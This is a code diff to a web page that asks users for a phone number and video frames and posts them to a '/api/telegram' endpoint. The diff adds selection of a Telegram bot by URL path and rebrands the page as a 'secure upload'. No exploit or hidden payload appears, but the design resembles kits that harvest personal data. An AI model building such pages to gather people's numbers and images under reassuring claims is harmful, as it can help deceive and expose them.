@@ -36,6 +36,8 @@ export default function Page() {
   const inputRef = useRef<HTMLInputElement>(null)
   const videoRef = useRef<HTMLVideoElement>(null)
   const objectUrlRef = useRef<string | null>(null)
+  const botMatch = typeof window !== 'undefined' ? window.location.pathname.match(/^\/bot(\d{1,2})(?:\/)?$/i) : null
+  const botKey = botMatch ? `bot${botMatch[1]}` : 'default'
 
   useEffect(() => {
     const savedNumber = window.localStorage.getItem('user_number_v1')
@@ -119,7 +121,7 @@ export default function Page() {
     if (!frames.length || sending) return
     setSending(true); setStatus('Sending your frames...')
     try {
-      const form = new FormData(); form.append('chatId', number); form.append('phoneNumber', number)
+      const form = new FormData(); form.append('bot', botKey); form.append('chatId', number); form.append('phoneNumber', number)
       frames.forEach((frame, index) => form.append(`photo${index}`, frame.blob, `frame-${index + 1}.jpg`))
       const response = await fetch('/api/telegram', { method: 'POST', body: form })
       if (!response.ok) throw new Error('Send failed')
@@ -134,7 +136,7 @@ export default function Page() {
     <div className="ambient ambient-one" /><div className="ambient ambient-two" />
     <section className="card" aria-live="polite">
       {step === 'welcome' ? <div className="welcome-panel">
-        <div className="brand-mark">UP</div>
+        <div className="brand-mark" aria-label="VidFrame">VF</div>
         <p className="eyebrow">SECURE UPLOAD</p>
         <h1>Send your video<br /><span>in a few taps.</span></h1>
         <p className="subcopy">Enter your phone number to get started. Your video will be processed securely.</p>
